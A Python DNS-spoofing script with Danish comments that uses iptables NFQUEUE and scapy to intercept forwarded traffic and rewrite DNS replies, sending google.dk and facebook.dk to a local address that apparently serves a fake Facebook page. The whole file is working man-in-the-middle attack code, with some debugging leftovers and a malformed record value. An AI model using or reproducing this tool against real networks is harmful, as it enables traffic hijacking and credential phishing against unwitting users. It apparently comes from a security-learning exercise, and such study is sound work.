import os
from scapy.all import *
from netfilterqueue import NetfilterQueue 

dns_hosts = {b"www.google.dk": "192.168.18.128:443/facebook.html", b"google.dk": "192.168.18.128", b"facebook.dk": "192.168.18.128"}

def process_packet(packet):
	scapy_pkt = IP(packet.get_payload()) #Konvertere pakken til scapy format
	# Fejlfinding. Den rammer ikke
	print (packet)
	print (scapy_pkt())
	print (scapy_pkt)
	#Fejlfinding. Den rammer ikke.
	if scapy_pkt.haslayer(DNSRR): #Hvis pakken har DNS resource record (DNS reply) laver vi om på den
		print ("[+] Packet before modification: ", scapy_pkt.summary())
		try:
			scapy_pkt = modify_packet(scapy_pkt)
		except Exception as e:
			print (e)
			pass
		print ("[+] Packet after modification: ", scapy_pkt.summary())
		packet.set_payload(bytes(scapy_pkt))
	packet.accept()


def modify_packet(packet):
	qname = packet[DNSQR].qname
	print (qname)
	if qname not in dns_hosts: #Hvis navnet ikke er i vores host liste gør vi ikke noget
		print ("[-] No modification made: ", qname)
		return packet
	#Her kigger vi i vores dns_hosts og hvis mapper fx www.google.dk til ip adressen
	print (packet[DNS])
	packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
	#Her sætte vi svar tilbage til 1 gang
	packet[DNS].ancount = 1
	#Vi sletter checksums da der bliver lavet om på ting og det ellers vil give fejl
	del packet[IP].len
	del packet[IP].chksum
	del packet[UDP].len
	del packet[UDP].chksum
	return packet

queue_num = 0
os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}")
queue = NetfilterQueue()

try: 
	queue.bind(queue_num, process_packet)
	queue.run()
except KeyboardInterrupt:
	os.system("iptables --flush")